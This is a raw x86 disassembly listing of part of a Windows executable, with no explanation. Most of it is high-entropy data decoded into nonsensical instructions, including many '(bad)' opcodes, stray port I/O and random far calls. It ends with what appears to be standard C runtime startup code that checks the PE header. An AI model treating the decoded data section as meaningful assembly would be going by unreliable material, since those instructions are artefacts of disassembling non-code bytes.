  423ce9:	mov    al,0xf4
  423ceb:	(bad)  
  423cec:	js     0x423c7e
  423cee:	inc    ecx
  423cef:	jae    0x423d08
  423cf1:	je     0x423ce2
  423cf3:	xlat   BYTE PTR ds:[ebx]
  423cf4:	xchg   ebx,eax
  423cf5:	in     eax,0x92
  423cf7:	or     ch,cl
  423cf9:	push   es
  423cfa:	dec    edi
  423cfb:	push   DWORD PTR fs:[ebp+0x50ed9975]
  423d02:	sbb    DWORD PTR [ebx-0x3f28fcac],ecx
  423d08:	cwde   
  423d09:	pop    eax
  423d0a:	dec    esi
  423d0b:	mov    ds:0xced63988,al
  423d10:	or     al,0x1d
  423d12:	mov    cl,0xd2
  423d14:	inc    ebp
  423d16:	inc    ebx
  423d17:	ds sub al,0xe5
  423d1a:	sbb    ebx,ebx
  423d1c:	fsub   DWORD PTR [ebx+0x69d53e65]
  423d22:	mov    eax,0x2776bcb1
  423d27:	mov    ch,0xaf
  423d29:	xchg   BYTE PTR [ecx-0x542d5ffb],dl
  423d2f:	(bad)  
  423d30:	pop    esi
  423d31:	dec    edi
  423d32:	pop    edi
  423d33:	stos   BYTE PTR es:[edi],al
  423d34:	mov    bl,BYTE PTR [edi+0x79]
  423d37:	loope  0x423d43
  423d39:	loope  0x423da4
  423d3b:	gs icebp 
  423d3d:	dec    edi
  423d3e:	inc    edi
  423d3f:	or     al,0x37
  423d41:	pop    esp
  423d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d43:	ins    DWORD PTR es:[edi],dx
  423d44:	jo     0x423d32
  423d46:	dec    ebp
  423d47:	lods   al,BYTE PTR ds:[esi]
  423d48:	sbb    BYTE PTR [edx+0xb],al
  423d4b:	jecxz  0x423cea
  423d4d:	pusha  
  423d4e:	sar    BYTE PTR [ebp+0x7f],cl
  423d51:	push   ds
  423d52:	sub    ecx,DWORD PTR [eax]
  423d54:	mov    edx,0x7fbe33ca
  423d59:	inc    eax
  423d5a:	mov    esi,0x7f96d7d0
  423d5f:	out    0x7b,al
  423d61:	dec    edi
  423d62:	jp     0x423d72
  423d64:	jmp    0x423d6a
  423d66:	pusha  
  423d67:	push   0xdc09ec29
  423d6c:	cmp    eax,0xdc665ff5
  423d71:	out    0xae,al
  423d73:	loop   0x423da9
  423d75:	lea    edx,[esi-0x2b]
  423d78:	mov    esp,0xb24a55b5
  423d7d:	push   0xd9408603
  423d82:	popf   
  423d83:	mov    DWORD PTR [ebp+eiz*1-0x31],eax
  423d87:	rol    DWORD PTR [edx+0x6409a81e],cl
  423d8d:	fld    TBYTE PTR [ebx-0x2f]
  423d90:	mov    ch,0x7e
  423d92:	addr16 pop ss
  423d94:	les    eax,FWORD PTR [ebx+0x84e8310]
  423d9a:	popa   
  423d9b:	jb     0x423d26
  423d9d:	mov    dh,0xe2
  423d9f:	(bad)  
  423da0:	js     0x423d9e
  423da2:	and    esp,DWORD PTR [esi-0x4db5d4c5]
  423da8:	clc    
  423da9:	inc    edx
  423daa:	dec    edx
  423dab:	(bad)  
  423dac:	sub    cl,BYTE PTR ds:0x986c4ec8
  423db2:	ror    DWORD PTR [ecx-0x4],1
  423db5:	pop    esp
  423db6:	ficom  DWORD PTR [ebp+0x2c]
  423db9:	mov    bl,0x48
  423dbb:	sub    DWORD PTR [ebp-0x5707b7da],ebx
  423dc1:	adc    esi,esp
  423dc3:	(bad)  
  423dc4:	repnz pop ebx
  423dc6:	arpl   WORD PTR [esi+0x74],bx
  423dc9:	push   0xffffffcf
  423dcb:	retf   0xccab
  423dce:	(bad)  
  423dcf:	ret    
  423dd0:	pop    esp
  423dd1:	push   esp
  423dd2:	dec    esp
  423dd3:	jmp    0x3ef:0xf8e9e1cf
  423dda:	retf   
  423ddb:	inc    ebx
  423ddc:	pop    ds
  423ddd:	xchg   ecx,eax
  423dde:	cmp    ebp,DWORD PTR [edi]
  423de0:	and    al,0x1e
  423de2:	js     0x423dc1
  423de4:	jnp    0x423da6
  423de6:	jle    0x423d94
  423de8:	icebp  
  423de9:	mov    WORD PTR [ebx+edx*1+0x7f],ds
  423ded:	sbb    al,0x80
  423def:	jns    0x423da3
  423df1:	stos   DWORD PTR es:[edi],eax
  423df2:	sub    al,0x3a
  423df4:	fwait
  423df5:	rcl    BYTE PTR [esp+ebp*4],1
  423df8:	out    0xcf,al
  423dfa:	jmp    0x423db9
  423dfc:	jmp    0x1494004e
  423e01:	cmc    
  423e02:	xchg   esi,eax
  423e03:	xchg   esi,eax
  423e04:	fs loopne 0x423e49
  423e07:	ja     0x423dd4
  423e09:	jno    0x423d93
  423e0b:	adc    BYTE PTR [esi+0x75528c23],dl
  423e11:	icebp  
  423e12:	in     eax,0x66
  423e14:	in     al,0x95
  423e16:	rcr    ah,cl
  423e18:	xlat   BYTE PTR ds:[ebx]
  423e19:	adc    eax,0xf5f482a7
  423e1e:	jecxz  0x423e22
  423e20:	mov    eax,ds:0x72597f6a
  423e25:	cmp    DWORD PTR [edx],edi
  423e27:	out    0x85,eax
  423e29:	or     BYTE PTR [edi+ebx*2+0x7],ah
  423e2d:	in     al,0x32
  423e2f:	mov    bl,0x21
  423e31:	(bad)  
  423e32:	dec    eax
  423e33:	leave  
  423e34:	ret    
  423e35:	jbe    0x423e66
  423e37:	ja     0x423e29
  423e39:	(bad)  
  423e3a:	in     al,dx
  423e3b:	mov    eax,0xf4a03633
  423e40:	clc    
  423e41:	mov    ch,0xb5
  423e43:	jne    0x423e13
  423e45:	dec    esi
  423e46:	xor    BYTE PTR [edx-0x561d79c6],cl
  423e4c:	div    BYTE PTR ds:0x7162c366
  423e52:	enter  0xbfa6,0x94
  423e56:	inc    ebx
  423e57:	enter  0xddd3,0x33
  423e5b:	fdivr  st(4),st
  423e5d:	lea    edi,[eax]
  423e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e60:	ja     0x423eb0
  423e62:	xor    al,0x3e
  423e64:	and    dh,ah
  423e66:	pop    eax
  423e67:	add    al,0xf0
  423e69:	popa   
  423e6a:	mov    fs,WORD PTR [ecx+eiz*4-0x19c941ec]
  423e71:	xchg   BYTE PTR [ebp-0x39131179],ch
  423e77:	call   0xc7d0546b
  423e7c:	(bad)  
  423e7d:	pop    edi
  423e7e:	test   DWORD PTR [eax-0x3d],ebx
  423e81:	mov    DWORD PTR [ebp-0xe6bd459],0x637afbaf
  423e8b:	imul   edi,DWORD PTR [ebx+0x2a],0x85c8a118
  423e92:	imul   edi,DWORD PTR [edx-0x51],0x50a95787
  423e99:	pushf  
  423e9a:	aas    
  423e9b:	push   ebx
  423e9c:	jmp    0x423e48
  423e9e:	test   ebx,ecx
  423ea0:	pusha  
  423ea1:	scas   al,BYTE PTR es:[edi]
  423ea2:	push   ds
  423ea3:	sub    BYTE PTR [ebx+eiz*2+0x46d32ab1],bl
  423eaa:	popf   
  423eab:	dec    eax
  423eac:	aam    0xca
  423eae:	cmp    DWORD PTR [esp+eiz*8],0x41d71611
  423eb5:	xlat   BYTE PTR ds:[ebx]
  423eb6:	es enter 0xab48,0x5e
  423ebb:	and    ecx,DWORD PTR [esi-0x28]
  423ebe:	jg     0x423f01
  423ec0:	jp     0x423f06
  423ec2:	fcomp  QWORD PTR [eax]
  423ec4:	mov    WORD PTR [esp+edi*2-0x4425bd4d],es
  423ecb:	sub    ebx,DWORD PTR ds:0xa4a8d973
  423ed1:	outs   dx,DWORD PTR ds:[esi]
  423ed2:	js     0x423ed2
  423ed4:	and    esp,eax
  423ed6:	fdivr  DWORD PTR [ebp-0x513f6fc]
  423edc:	jge    0x423f35
  423ede:	jno    0x423eab
  423ee0:	nop
  423ee1:	loopne 0x423eb6
  423ee3:	or     eax,0x105b3f2b
  423ee8:	mov    dh,BYTE PTR [esi]
  423eea:	adc    al,0x50
  423eec:	dec    ebx
  423eed:	add    DWORD PTR [ebx-0x7d],0x5c
  423ef1:	imul   esi,eax,0xc94ab8cf
  423ef7:	push   ds
  423ef8:	inc    ebx
  423ef9:	mov    edx,0x2f5660d5
  423efe:	push   eax
  423eff:	cwde   
  423f00:	aam    0x5
  423f02:	mov    ah,0xa5
  423f04:	xor    BYTE PTR [edi-0xa],al
  423f07:	xchg   edi,eax
  423f08:	(bad)  
  423f09:	fbld   TBYTE PTR [edx]
  423f0b:	popf   
  423f0c:	(bad)  
  423f0d:	xchg   esp,eax
  423f0e:	mov    al,0x6c
  423f10:	push   cs
  423f11:	adc    al,0xda
  423f13:	data16 sub al,0x21
  423f16:	arpl   sp,ax
  423f18:	mov    WORD PTR [edi],?
  423f1a:	mov    al,0x83
  423f1c:	cmp    ebx,0xffffffa3
  423f1f:	cs jge 0x423f96
  423f22:	mov    bl,0x1f
  423f24:	adc    ecx,0xffffff87
  423f27:	sub    eax,0x5bd51545
  423f2c:	(bad)  
  423f2d:	dec    eax
  423f2e:	adc    eax,0x76cc41ff
  423f33:	push   0xffffff9c
  423f35:	int    0xe0
  423f37:	aas    
  423f38:	test   eax,0x66530493
  423f3d:	(bad)  
  423f3e:	fwait
  423f3f:	mov    ch,0xd4
  423f41:	mov    cl,0x2f
  423f43:	repnz adc eax,0xbad4688e
  423f49:	mov    dh,0xbb
  423f4b:	dec    ebp
  423f4c:	mov    eax,0x536ca940
  423f51:	add    ecx,DWORD PTR [ecx-0x2f]
  423f54:	pop    edi
  423f55:	test   al,0x6b
  423f57:	in     al,dx
  423f58:	sbb    esi,esi
  423f5a:	fs sahf 
  423f5c:	mov    ebp,0x13b2d632
  423f61:	dec    ebp
  423f62:	adc    bl,BYTE PTR [ebp+edi*1-0x1b2aecd8]
  423f69:	mov    cl,0x44
  423f6b:	xchg   edx,eax
  423f6c:	jg     0x423f63
  423f6e:	addr16 clc 
  423f70:	arpl   WORD PTR [edx-0x6ffcb68d],di
  423f76:	loope  0x423f89
  423f78:	out    dx,al
  423f79:	xchg   ecx,eax
  423f7a:	dec    edx
  423f7b:	repz cmp al,0x4f
  423f7e:	retf   0x1986
  423f81:	dec    esi
  423f82:	mov    eax,ds:0x9b003cd1
  423f87:	jl     0x423faf
  423f89:	inc    edi
  423f8a:	fbld   TBYTE PTR cs:[edi]
  423f8d:	and    DWORD PTR [eax-0xb],ebp
  423f90:	mov    eax,ds:0x9f97333c
  423f95:	addr16 test al,0x59
  423f98:	jnp    0x423f6f
  423f9a:	sub    eax,0xe8932e6a
  423f9f:	dec    ebp
  423fa0:	mov    ds:0x5e1ac3bf,al
  423fa5:	adc    eax,0xea3f89d0
  423faa:	adc    ecx,DWORD PTR [ebp+0x7e1dd297]
  423fb0:	xor    cl,BYTE PTR [ebx]
  423fb2:	(bad)  
  423fb3:	outs   dx,DWORD PTR ds:[esi]
  423fb4:	push   cs
  423fb5:	out    dx,eax
  423fb6:	pop    ecx
  423fb7:	lea    ebx,[edx+eax*2+0x78]
  423fbb:	sar    al,0x25
  423fbe:	cmp    DWORD PTR [eax-0x2c],ebx
  423fc1:	mov    ah,0x29
  423fc3:	sub    BYTE PTR [ecx-0x2e],ch
  423fc6:	cwde   
  423fc7:	pop    ecx
  423fc8:	nop
  423fc9:	into   
  423fca:	jbe    0x423fed
  423fcc:	pop    es
  423fcd:	fmul   QWORD PTR [edi-0x1c]
  423fd0:	xchg   ebx,eax
  423fd1:	push   0xffffffb8
  423fd3:	popf   
  423fd4:	cdq    
  423fd5:	gs mov ebx,0xe7599ea3
  423fdb:	pop    esp
  423fdc:	imul   esi,DWORD PTR [ecx+0x75],0x2c4c262f
  423fe3:	adc    DWORD PTR [ebx],ebx
  423fe5:	in     eax,0xd2
  423fe7:	jno    0x423fa7
  423fe9:	sub    al,0xed
  423feb:	and    eax,DWORD PTR [esi-0x3574b32d]
  423ff1:	ror    DWORD PTR [ecx],cl
  423ff3:	and    ebp,DWORD PTR [ebx+0x5e]
  423ff6:	add    BYTE PTR [eax-0x7193b885],bl
  423ffc:	daa    
  423ffd:	xchg   edx,eax
  423ffe:	jb     0x424031
  424000:	add    BYTE PTR [eax+0x3afd6be0],ch
  424006:	cmp    BYTE PTR [eax+0x4],dh
  424009:	push   edx
  42400a:	je     0x423fe1
  42400c:	test   BYTE PTR [ebx+0x1552562b],0xee
  424013:	les    esi,FWORD PTR [edi-0x3065325]
  424019:	or     DWORD PTR [ecx-0x47],ecx
  42401c:	repz test BYTE PTR [edi-0x18],al
  424020:	mov    dh,0x79
  424022:	aas    
  424023:	scas   eax,DWORD PTR es:[edi]
  424024:	clc    
  424025:	call   0xa181:0x71125998
  42402c:	sub    DWORD PTR [edi+0x1d],ebx
  42402f:	push   esp
  424030:	sub    eax,0x16c8dbaf
  424035:	dec    esp
  424036:	jle    0x424029
  424038:	sbb    DWORD PTR [edi-0x138438e2],eax
  42403e:	(bad)  
  42403f:	shl    DWORD PTR [ecx-0x6e],1
  424042:	(bad)  
  424044:	pop    ds
  424045:	imul   ebx,DWORD PTR [esi+0x12],0x83d4c54e
  42404c:	jl     0x4240b1
  42404e:	rcl    esp,cl
  424050:	iret   
  424051:	(bad)  
  424052:	mov    ebp,0x326ea9d7
  424057:	add    DWORD PTR [ecx+0x77],ebp
  42405a:	jmp    0x4240c4
  42405c:	add    DWORD PTR [eax-0x5c3b2f28],esp
  424062:	dec    DWORD PTR [eax+ecx*4-0x3034b7e]
  424069:	int3   
  42406a:	mov    dh,0x4a
  42406c:	jb     0x423ff5
  42406e:	aaa    
  42406f:	cmc    
  424070:	fnsave [edi+0x7]
  424073:	aam    0x6f
  424075:	test   DWORD PTR [ecx+edx*8-0x50016872],0xbd5bd75e
  424080:	jle    0x42406e
  424082:	gs pop ecx
  424084:	(bad)  
  424085:	sar    dl,1
  424087:	jmp    0x42407c
  424089:	repz call 0x8c6597bf
  42408f:	inc    ebp
  424090:	mov    WORD PTR [edx+0x5b67aad],fs
  424096:	pop    ds
  424097:	xchg   DWORD PTR [eax],ebp
  424099:	call   0x4d80d7c6
  42409e:	sub    eax,DWORD PTR ds:0x46171933
  4240a4:	and    BYTE PTR [eax],dl
  4240a6:	mov    eax,0x2b82ed0e
  4240ab:	jbe    0x4240d7
  4240ad:	test   al,0xf
  4240af:	push   ds
  4240b0:	mov    bl,0x36
  4240b2:	arpl   WORD PTR [ebx+0x567b2fc4],di
  4240b8:	pop    ss
  4240b9:	shl    esi,1
  4240bb:	fcomi  st,st(2)
  4240bd:	fs ret 
  4240bf:	stc    
  4240c0:	inc    eax
  4240c1:	addr16 mov cl,0x70
  4240c4:	mov    ecx,0x498f5a7
  4240c9:	fld    QWORD PTR [ebp+0x33b6c61a]
  4240cf:	mov    dl,0x79
  4240d1:	sub    DWORD PTR ss:[bp+di-0x6],edi
  4240d6:	ror    BYTE PTR [esi+0x1ef390b2],0x6e
  4240dd:	mov    ah,0x34
  4240df:	jo     0x424147
  4240e1:	arpl   WORD PTR [esi+0x38],si
  4240e4:	sbb    al,0xfd
  4240e6:	mov    WORD PTR [esp+eiz*4+0x562b3f4c],?
  4240ed:	(bad)  
  4240ee:	push   eax
  4240ef:	push   esi
  4240f0:	adc    dl,dh
  4240f2:	and    al,0xdc
  4240f4:	push   esi
  4240f5:	mov    ah,0xa8
  4240f7:	sti    
  4240f8:	nop
  4240f9:	mov    al,ds:0x70cec8b8
  4240fe:	cmp    eax,0x925033b0
  424103:	mov    bh,BYTE PTR [eax]
  424105:	cdq    
  424106:	(bad)  
  424107:	xchg   esp,eax
  424108:	or     edi,esp
  42410a:	ds out 0xb4,eax
  42410d:	bound  eax,QWORD PTR [edi]
  42410f:	jp     0x42418a
  424111:	lods   eax,DWORD PTR ds:[esi]
  424112:	sbb    eax,0xb0dda3d3
  424117:	mov    ebx,0xd5b03eab
  42411c:	int3   
  42411d:	jae    0x4240e7
  42411f:	or     al,0x5c
  424121:	es jnp 0x424117
  424124:	lea    edi,[edi+0xe]
  424127:	call   0xb604:0x66e708eb
  42412e:	pop    edi
  42412f:	jmp    0x424130
  424131:	jle    0x4240f8
  424133:	adc    al,0x32
  424135:	sti    
  424136:	mov    BYTE PTR [ebp+ebx*2+0x58],bh
  42413a:	dec    edx
  42413b:	outs   dx,BYTE PTR ds:[esi]
  42413c:	inc    edx
  42413e:	add    BYTE PTR [edx-0x5e1c0d47],ch
  424144:	outs   dx,DWORD PTR ds:[esi]
  424145:	sbb    cl,BYTE PTR [ebx]
  424147:	(bad)  
  424148:	arpl   WORD PTR [ecx+0x4487f771],bp
  42414e:	jbe    0x424100
  424150:	cmp    eax,DWORD PTR [edi-0x53c7691f]
  424156:	xor    al,0x37
  424158:	iret   
  424159:	xor    al,dh
  42415b:	test   DWORD PTR [eax],ebp
  42415d:	(bad)  
  42415e:	or     DWORD PTR [ecx+0x2f6829f2],ebx
  424164:	xchg   esp,eax
  424165:	xchg   esi,eax
  424166:	test   DWORD PTR [ebp+0x5],edi
  424169:	je     0x4241a5
  42416b:	repz mov dl,0x34
  42416e:	(bad)  [ebp+0x6b]
  424171:	stc    
  424172:	out    dx,al
  424173:	push   ecx
  424174:	jno    0x424134
  424176:	stos   BYTE PTR es:[edi],al
  424177:	mov    esi,DWORD PTR cs:[ebx]
  42417a:	arpl   WORD PTR [edx+0x1fc35057],si
  424180:	xchg   ebp,eax
  424181:	push   ebp
  424182:	inc    eax
  424183:	mov    dl,0x70
  424185:	dec    edi
  424186:	xchg   ebx,eax
  424187:	mov    WORD PTR [eax+ecx*4],fs
  42418a:	addr16 sbb eax,0x8d6f82e7
  424190:	dec    ecx
  424191:	sbb    eax,0xb71ab8ce
  424196:	les    ebx,FWORD PTR [ecx]
  424198:	fisttp QWORD PTR fs:[ebp-0x5b20b3db]
  42419f:	sbb    BYTE PTR [eax+0x3ecda0b5],0x82
  4241a6:	jno    0x4241de
  4241a8:	gs push edx
  4241aa:	pop    es
  4241ab:	jge    0x4241aa
  4241ad:	ret    
  4241ae:	adc    al,BYTE PTR [edx-0x7c82c292]
  4241b4:	or     edi,DWORD PTR [edx-0x34153814]
  4241ba:	(bad)  [ebx+0x5fc04454]
  4241c0:	sahf   
  4241c1:	or     dh,BYTE PTR [edi-0x765a77b5]
  4241c7:	mov    es,WORD PTR [esi+ebp*4-0x65cd73e8]
  4241ce:	dec    esi
  4241cf:	loope  0x42424e
  4241d1:	cmp    ch,bh
  4241d3:	std    
  4241d4:	add    edx,ebp
  4241d6:	pop    edx
  4241d7:	(bad)  
  4241d9:	scas   al,BYTE PTR es:[edi]
  4241da:	xor    esp,ecx
  4241dc:	lds    edi,FWORD PTR [ecx]
  4241de:	std    
  4241df:	addr16 in eax,dx
  4241e1:	mov    cl,0xa9
  4241e3:	in     eax,0x7f
  4241e5:	adc    cl,dh
  4241e7:	(bad)  
  4241e8:	pusha  
  4241e9:	push   eax
  4241ea:	lods   eax,DWORD PTR ds:[esi]
  4241eb:	xchg   ebx,eax
  4241ec:	mov    eax,0x6c59105d
  4241f1:	(bad)  
  4241f2:	fstp   TBYTE PTR [ecx+0x6e]
  4241f5:	out    0x66,eax
  4241f7:	(bad)  
  4241f8:	int3   
  4241f9:	dec    ebp
  4241fa:	push   ebp
  4241fb:	imul   DWORD PTR [edi]
  4241fd:	sub    ah,BYTE PTR [esi-0x2f5d7bf2]
  424203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424204:	xchg   BYTE PTR [edx*4-0xef97d3e],ah
  42420b:	lods   eax,DWORD PTR ds:[esi]
  42420c:	jg     0x424204
  42420e:	pop    es
  42420f:	add    ebx,ebp
  424211:	loop   0x424202
  424213:	test   al,0xa2
  424215:	(bad)  
  424216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424217:	cmp    BYTE PTR [edi+0x67],ch
  42421a:	retf   0xc6e8
  42421d:	push   edi
  42421e:	in     al,0xb6
  424220:	xchg   ebx,eax
  424221:	(bad)  
  424222:	push   edi
  424223:	sub    edi,ebp
  424225:	cmp    cl,BYTE PTR [ebx+0x69]
  424228:	xchg   ebx,ebx
  42422a:	div    esi
  42422c:	or     eax,0x86c108c4
  424231:	test   BYTE PTR [esi+0x1e],dl
  424234:	das    
  424235:	xchg   esp,eax
  424236:	lds    eax,FWORD PTR [edi-0x58ef3e8b]
  42423c:	aam    0x57
  42423e:	test   DWORD PTR [ecx-0x5777d00],esi
  424244:	inc    esi
  424245:	shl    DWORD PTR [eax],0x1d
  424248:	leave  
  424249:	and    al,0x13
  42424b:	or     dh,BYTE PTR [edx-0x6e]
  42424e:	hlt    
  42424f:	pop    ecx
  424250:	mov    edx,0xb1236704
  424255:	sub    DWORD PTR [ebx],ebx
  424257:	popa   
  424258:	push   ecx
  424259:	mov    al,ds:0xf39e276b
  42425e:	je     0x42426f
  424260:	dec    edi
  424261:	shr    ecx,cl
  424263:	(bad)  
  424264:	sub    eax,0x9a30372f
  424269:	add    al,0x6a
  42426b:	es jg  0x4242a6
  42426e:	fild   DWORD PTR [edi]
  424270:	mov    eax,0x660f0780
  424275:	mov    eax,ds:0xf01dae82
  42427a:	imul   eax,ebp,0x49
  42427d:	xlat   BYTE PTR ds:[ebx]
  42427e:	push   esi
  42427f:	(bad)  
  424280:	out    0x1f,eax
  424282:	jns    0x424235
  424284:	mov    cl,ch
  424286:	xlat   BYTE PTR ds:[ebx]
  424287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424288:	xchg   ecx,eax
  424289:	out    dx,al
  42428a:	mov    esi,0x4a350c93
  42428f:	fbld   TBYTE PTR [ecx+0x15953cc0]
  424295:	cwde   
  424296:	cmp    DWORD PTR [edx],ebp
  424298:	(bad)  
  424299:	gs pop ecx
  42429b:	xor    eax,0x94a7a618
  4242a0:	xor    DWORD PTR [eax],edx
  4242a2:	dec    edi
  4242a3:	or     al,0xf7
  4242a5:	ja     0x424308
  4242a7:	pop    es
  4242a8:	adc    DWORD PTR [ebp+ebp*8+0x7a],ecx
  4242ac:	pop    ss
  4242ad:	sbb    al,BYTE PTR [edx+0x4a]
  4242b0:	iret   
  4242b1:	push   edi
  4242b2:	dec    ebx
  4242b3:	inc    esi
  4242b4:	call   0x4ac2:0xfa1ea1c5
  4242bb:	ds call 0xe132:0x5f923b27
  4242c3:	add    eax,0xdea7404e
  4242c8:	xchg   esi,eax
  4242c9:	call   0xaccdaeff
  4242ce:	outs   dx,BYTE PTR ds:[esi]
  4242cf:	dec    esp
  4242d0:	lods   al,BYTE PTR ss:[esi]
  4242d2:	jnp    0x4242a7
  4242d4:	or     al,bh
  4242d6:	or     al,0xdd
  4242d8:	inc    esi
  4242d9:	add    eax,0x21afc347
  4242de:	cld    
  4242df:	imul   ecx,DWORD PTR [edx],0x41
  4242e2:	dec    ah
  4242e4:	and    eax,0xb123971d
  4242e9:	in     eax,0xc4
  4242eb:	add    edi,DWORD PTR [eax]
  4242ed:	mov    eax,0x50c23fe6
  4242f2:	dec    edx
  4242f3:	scas   eax,DWORD PTR es:[edi]
  4242f4:	aad    0xb8
  4242f6:	scas   al,BYTE PTR es:[edi]
  4242f7:	mov    DWORD PTR [esi],edi
  4242f9:	repnz cmp BYTE PTR [ebp+0x57a08d3b],0xce
  424301:	out    0xb3,al
  424303:	cmp    DWORD PTR [eax+edx*8-0x3f],eax
  424307:	xchg   ebx,eax
  424308:	xchg   edi,eax
  424309:	push   0x3b
  42430b:	dec    ebp
  42430c:	sar    DWORD PTR [edx-0x16],cl
  42430f:	dec    DWORD PTR [edi+0x6bc2f1e6]
  424315:	cli    
  424316:	xchg   ebp,eax
  424317:	test   DWORD PTR [esi],eax
  424319:	imul   edx,DWORD PTR [edx],0x4b
  42431c:	cwde   
  42431d:	and    al,0xe8
  42431f:	mov    eax,0xc3730ab5
  424324:	push   ebp
  424325:	sahf   
  424326:	repz pop esp
  424328:	or     BYTE PTR [edi+0x4156c5f2],dh
  42432e:	adc    BYTE PTR [eax+0x8],0x35
  424332:	fst    QWORD PTR [esi]
  424334:	les    eax,FWORD PTR [eax+ebx*2]
  424337:	cmc    
  424338:	pop    DWORD PTR [eax+0x6a]
  42433b:	je     0x42438d
  42433d:	das    
  42433e:	stos   BYTE PTR es:[edi],al
  42433f:	jb     0x4242d7
  424341:	lods   al,BYTE PTR ds:[esi]
  424342:	hlt    
  424343:	inc    ebx
  424344:	js     0x424385
  424346:	popa   
  424347:	fsub   DWORD PTR [ecx]
  424349:	adc    DWORD PTR [eax],eax
  42434b:	push   edi
  42434c:	pop    esi
  42434d:	dec    esp
  42434e:	sub    DWORD PTR [ecx-0x62bac63e],edx
  424354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424355:	sbb    BYTE PTR [eax+0x7981575],0x30
  42435c:	dec    esp
  42435d:	or     dl,bh
  42435f:	popf   
  424360:	add    eax,0x42543d74
  424365:	xchg   ecx,eax
  424366:	and    cl,BYTE PTR [edx+edi*8+0x61]
  42436a:	loope  0x4243e3
  42436c:	inc    edi
  42436d:	out    0xc8,eax
  42436f:	sbb    bh,BYTE PTR [ebp-0x28]
  424372:	test   eax,0xa37fc46e
  424377:	pop    esp
  424378:	xchg   ebp,eax
  424379:	sub    ecx,DWORD PTR [esi-0x47009f63]
  42437f:	and    eax,0x17a7d96e
  424384:	cmp    al,0x6f
  424386:	lahf   
  424387:	push   edx
  424388:	inc    ebx
  424389:	dec    ebp
  42438a:	push   es
  42438b:	sub    dh,BYTE PTR [eax]
  42438d:	hlt    
  42438e:	mov    ah,0x8
  424390:	out    dx,eax
  424391:	int3   
  424392:	nop
  424393:	js     0x4243c9
  424395:	inc    edx
  424396:	and    cl,BYTE PTR [edx+0x50]
  424399:	jne    0x424402
  42439b:	test   BYTE PTR [ecx],0x2f
  42439e:	mul    ch
  4243a0:	pop    ds
  4243a1:	mov    edx,edx
  4243a3:	retf   0xdb8
  4243a6:	add    bh,BYTE PTR [ecx+eax*8-0x40339df4]
  4243ad:	jae    0x424346
  4243af:	test   al,0xb3
  4243b1:	xchg   edx,eax
  4243b2:	sub    esp,ecx
  4243b4:	ins    DWORD PTR es:[edi],dx
  4243b5:	jmp    0x38ec:0x136b4000
  4243bc:	int    0x2a
  4243be:	sar    dl,0xe
  4243c1:	ss xor eax,0x97d7abd4
  4243c7:	nop
  4243c8:	sub    BYTE PTR [esi+0x61ed0ba2],ah
  4243ce:	loop   0x424391
  4243d0:	int3   
  4243d1:	mov    ebp,ebp
  4243d3:	(bad)  [ecx-0x9]
  4243d6:	fmul   st(6),st
  4243d8:	out    dx,al
  4243d9:	ret    
  4243da:	sar    BYTE PTR [edi+0x5d6049d7],1
  4243e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243e1:	xchg   edx,eax
  4243e2:	pop    edx
  4243e3:	mov    ebp,0x3a59278d
  4243e8:	mov    eax,ds:0x8631b2a0
  4243ed:	push   edx
  4243ee:	push   0x0
  4243f0:	push   0x0
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
